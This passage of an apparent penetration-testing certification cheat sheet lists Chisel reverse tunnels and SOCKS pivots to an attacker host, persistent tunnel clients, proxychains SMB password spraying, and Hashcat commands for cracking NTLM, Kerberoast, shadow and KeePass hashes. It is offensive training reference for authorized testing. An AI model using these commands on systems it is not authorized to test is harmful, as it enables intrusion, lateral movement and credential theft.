./chisel client $LHOST:$LPORT R:$LPORT:$TARGET:445 # expose $TARGET SMB 445 back to $LHOST on $LPORT
./chisel client $LHOST:$LPORT L:8080:$TARGET:80 # forward $TARGET web port 80 to $LHOST 8080 for browsing
./chisel client $LHOST:$LPORT L:$LPORT:$DOMAIN:88 # forward $DOMAIN Kerberos 88 through pivot to $LHOST port
```
## SOCKS Proxying and Proxychains
```bash
proxychains nmap -sT -Pn $TARGET # scan hidden $TARGET through SOCKS proxy chained via $LHOST tunnel
proxychains crackmapexec smb $TARGET -u $USER -p $PASSWORD # spray $TARGET SMB via proxy using $USER and $PASSWORD
export LD_PRELOAD=/usr/lib/proxychains.so # preload proxychains library routing tools via $LHOST SOCKS tunnel

## File Transfer and Binary Staging
```bash

chmod +x ./chisel # make Chisel executable on $TARGET pivot before $LHOST connect
```
## Persistence and Keepalive
```bash
./chisel client --keepalive 10s $LHOST:$LPORT R:socks # maintain tunnel from $TARGET with 10s keepalive to $LHOST
./chisel client --max-retry-count 99 $LHOST:$LPORT R:socks # auto-reconnect from $TARGET to $LHOST up to 99 times
nohup ./chisel client $LHOST:$LPORT R:socks & # background persistent client on $TARGET linking to $LHOST server

```

tools.rawMarkdown:
#hashcat #cracking #ntlm #kerberoast #gpu #htb #cpts #oscp
# Hashcat Quick Reference (Commands Only)
> **🎯 Why:** GPU-accelerated hash cracker recovering $PASSWORD cleartext from $NTLM_HASH dumps and Kerberos tickets.
> **📍 Where:** $LHOST GPU attack box cracking $TARGET hashes offline on OpenCL CUDA devices.
> **⏰ When to use:** After dumping $NTLM_HASH or hashes to crack with $WORDLIST before reusing $PASSWORD on $TARGET.
## Identify Mode and Benchmark Device
```bash
hashcat -m 1000 hashes.txt $WORDLIST # crack $NTLM_HASH NTLM hashes in file with $WORDLIST passwords
hashcat -m 1000 $NTLM_HASH $WORDLIST # crack single $NTLM_HASH NTLM value directly with $WORDLIST list
hashcat -m 5600 netntlmv2.txt $WORDLIST # crack $TARGET NetNTLMv2 capture proving $USER $PASSWORD pair
hashcat -I # list GPU devices on $LHOST confirming OpenCL backend before $TARGET crack
hashcat -b -m 1000 # benchmark NTLM speed on $LHOST sizing $WORDLIST attack on $TARGET
```
## NTLM and NetNTLM Cracking
```bash
hashcat -m 1000 -a 0 hashes.txt $WORDLIST -o cracked-$TARGET.txt # dictionary-crack $TARGET NTLM file saving hits
hashcat -m 5500 -a 0 netntlmv1.txt $WORDLIST # crack $TARGET NetNTLMv1 challenge proving $USER password
hashcat -m 5600 -a 0 netntlmv2.txt $WORDLIST --username # crack $DOMAIN $USER NetNTLMv2 keeping usernames intact
hashcat -m 1000 -a 0 --show hashes.txt # show already-cracked $TARGET NTLM pairs without re-cracking
hashcat -m 1000 -a 0 --remove hashes.txt $WORDLIST # crack $TARGET NTLM and remove done hashes from file
```
## Linux Kerberos and AD Hashes
```bash
hashcat -m 1800 -a 0 shadow.hash $WORDLIST # crack $TARGET sha512crypt shadow hash with $WORDLIST passwords
hashcat -m 13100 -a 0 krb5tgs.txt $WORDLIST # crack $TARGET Kerberoast TGS recovering $DOMAIN service $PASSWORD
hashcat -m 18200 -a 0 krb5asrep.txt $WORDLIST # crack $TARGET AS-REP roast for $DOMAIN $USER without preauth
hashcat -m 22000 -a 0 wpa.hc22000 $WORDLIST # crack $TARGET WPA handshake file with $WORDLIST candidates
hashcat -m 13400 -a 0 keepass.hash $WORDLIST # crack $TARGET KeePass hash unlocking vault for $USER loot
```
## Mask and Brute-Force Attacks
```bash
hashcat -m 1000 -a 3 $NTLM_HASH ?l?l?l?l?d?d # mask-crack $NTLM_HASH as 4-lower plus 2-digit $PASSWORD pattern
hashcat -m 1000 -a 3 hashes.txt ?u?l?l?l?l?d?s # mask-crack $TARGET NTLM file with upper-lower-digit-symbol shape
hashcat -m 1000 -a 3 --increment --increment-min 6 $NTLM_HASH ?a?a?a?a?a?a?a?a # incremental mask on $NTLM_HASH from length 6 upward
hashcat -m 1800 -a 3 shadow.hash ?l?l?l?l?l?l?d?d # mask-crack $TARGET Linux hash targeting short lowercase plus digits
```
## Rules Mutations and Wordlists
```bash
hashcat -m 1000 -a 0 hashes.txt $WORDLIST -r /usr/share/hashcat/rules/best64.rule # mutate $WORDLIST with best64 rules against $TARGET hashes
hashcat -m 1000 -a 0 $NTLM_HASH $WORDLIST -r /usr/share/hashcat/rules/d3ad0ne.rule # mutate $WORDLIST with d3ad0ne rules cracking $NTLM_HASH
hashcat --stdout $WORDLIST -r /usr/share/hashcat/rules/best64.rule > mutated-$TARGET.txt # expand $WORDLIST mutations saving $TARGET candidate list
sort -u mutated-$TARGET.txt -o $WORDLIST # deduplicate $TARGET mutated list back into clean $WORDLIST file
```
## Sessions Show and Restore
```bash
hashcat -m 1000 -a 0 hashes.txt $WORDLIST --status # show live $LHOST crack status for $TARGET NTLM job
hashcat -m 1000 -a 0 hashes.txt $WORDLIST --session $TARGET # name session $TARGET isolating $NTLM_HASH job on $LHOST
hashcat --session $TARGET --restore # resume $TARGET session continuing $WORDLIST crack on $LHOST
hashcat --session $TARGET --status # query $TARGET session progress proving $USER $PASSWORD recovery state
```
## Help and Info
```bash
hashcat --help # display Hashcat help listing modes tuning $WORDLIST attacks on $TARGET
hashcat --example-hashes # show sample hashes mapping $NTLM_HASH to mode numbers for $TARGET
hashcat -m 1000 --help # show NTLM module options tuning $NTLM_HASH crack on $LHOST
man hashcat # open full Hashcat manual detailing $LHOST GPU flags for $TARGET jobs
```
